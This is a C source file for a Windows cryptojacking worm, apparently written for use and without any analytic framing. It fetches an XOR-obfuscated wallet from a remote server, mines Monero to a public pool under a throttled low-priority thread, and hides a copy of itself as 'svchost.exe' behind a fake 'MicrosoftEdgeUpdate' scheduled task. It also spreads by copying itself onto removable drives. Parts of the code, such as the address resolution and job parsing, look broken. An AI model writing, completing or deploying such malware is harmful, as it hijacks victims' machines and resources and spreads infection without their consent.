#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <randomx.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "randomx.lib")

#define POOL_ADDR "pool.supportxmr.com"
#define POOL_PORT 443
#define THREADS 2
#define CPU_THROTTLE_MS 5

typedef struct {
    SOCKET sock;
    randomx_vm *vm;
    char wallet[128];
} MinerContext;

static void fetch_config(char *wallet, size_t wallet_size) {
    HINTERNET hNet = InternetOpenA(NULL, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    HINTERNET hUrl = InternetOpenUrlA(hNet, "https://xxxxxxxx.com/config.bin", NULL, 0, INTERNET_FLAG_SECURE, 0);
    DWORD read = 0;
    InternetReadFile(hUrl, wallet, wallet_size, &read);
    InternetCloseHandle(hUrl);
    InternetCloseHandle(hNet);
    for (int i = 0; i < read; i++) wallet[i] ^= 0xAA;
}

static SOCKET connect_pool(void) {
    SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(POOL_PORT);
    inet_pton(AF_INET, POOL_ADDR, &addr.sin_addr);
    if (connect(s, (struct sockaddr*)&addr, sizeof(addr)) == SOCKET_ERROR) {
        closesocket(s);
        return INVALID_SOCKET;
    }
    return s;
}

static int send_stratum(SOCKET s, const char *json) {
    char buf[4096];
    snprintf(buf, sizeof(buf), "%s\r\n", json);
    return send(s, buf, strlen(buf), 0);
}

static int recv_line(SOCKET s, char *buf, int len) {
    int i = 0;
    while (i < len - 1) {
        int r = recv(s, buf + i, 1, 0);
        if (r <= 0) return -1;
        if (buf[i] == '\n') break;
        i++;
    }
    buf[i] = 0;
    return i;
}

static void mine_thread(void *ctx) {
    MinerContext *mc = (MinerContext*)ctx;
    char buf[4096];
    char job[256];
    char target[64];
    char nonce[64];
    SOCKET s = mc->sock;
    randomx_vm *vm = mc->vm;
    char login[512];
    snprintf(login, sizeof(login), "{\"method\":\"login\",\"params\":{\"login\":\"%s\"}}", mc->wallet);
    send_stratum(s, login);
    recv_line(s, buf, sizeof(buf));
    while (1) {
        if (recv_line(s, buf, sizeof(buf)) <= 0) {
            closesocket(s);
            s = connect_pool();
            if (s == INVALID_SOCKET) {
                Sleep(30000);
                continue;
            }
            send_stratum(s, login);
            recv_line(s, buf, sizeof(buf));
        }
        char *p = strstr(buf, "\"job_id\"");
        if (p) {
            sscanf(p, "\"job_id\":\"%[^\"]\",\"blob\":\"%[^\"]\",\"target\":\"%[^\"]\"", job, buf, target);
            randomx_calculate_hash(vm, buf, strlen(buf), nonce);
            char submit[512];
            snprintf(submit, sizeof(submit), "{\"method\":\"submit\",\"params\":{\"id\":\"%s\",\"nonce\":\"%s\"}}", job, nonce);
            send_stratum(s, submit);
            recv_line(s, buf, sizeof(buf));
        }
        Sleep(CPU_THROTTLE_MS);
    }
}

static void persist(void) {
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);
    char dest[MAX_PATH];
    snprintf(dest, sizeof(dest), "%s\\Microsoft\\Windows\\Caches\\svchost.exe", getenv("PROGRAMDATA"));
    CopyFileA(path, dest, FALSE);
    SetFileAttributesA(dest, FILE_ATTRIBUTE_HIDDEN);
    char cmd[1024];
    snprintf(cmd, sizeof(cmd), "schtasks /create /tn \"MicrosoftEdgeUpdate\" /tr \"%s\" /sc onlogon /f", dest);
    WinExec(cmd, SW_HIDE);
}

static void spread_usb(void) {
    for (char d = 'D'; d <= 'Z'; d++) {
        char root[4] = {d, ':', '\\', 0};
        if (GetDriveTypeA(root) == DRIVE_REMOVABLE) {
            char dest[260];
            snprintf(dest, sizeof(dest), "%sSystem Volume Information\\winstore.exe", root);
            char self[MAX_PATH];
            GetModuleFileNameA(NULL, self, MAX_PATH);
            CopyFileA(self, dest, FALSE);
            SetFileAttributesA(dest, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
        }
    }
}

static DWORD WINAPI usb_monitor(LPVOID ignored) {
    while (1) {
        spread_usb();
        Sleep(30000);
    }
    return 0;
}

int WINAPI WinMain(HINSTANCE h, HINSTANCE p, LPSTR cmd, int show) {
    WSADATA wsa;
    WSAStartup(MAKEWORD(2,2), &wsa);
    randomx_cache *cache = randomx_alloc_cache(RANDOMX_FLAG_DEFAULT);
    randomx_init_cache(cache, NULL, 0);
    randomx_vm *vm = randomx_create_vm(RANDOMX_FLAG_DEFAULT, cache, NULL);
    MinerContext mc;
    memset(&mc, 0, sizeof(mc));
    fetch_config(mc.wallet, sizeof(mc.wallet));
    mc.vm = vm;
    mc.sock = connect_pool();
    if (mc.sock != INVALID_SOCKET) {
        HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)mine_thread, &mc, 0, NULL);
        SetThreadPriority(hThread, THREAD_PRIORITY_LOWEST);
    }
    persist();
    CreateThread(NULL, 0, usb_monitor, NULL, 0, NULL);
    while (1) Sleep(60000);
    return 0;
}
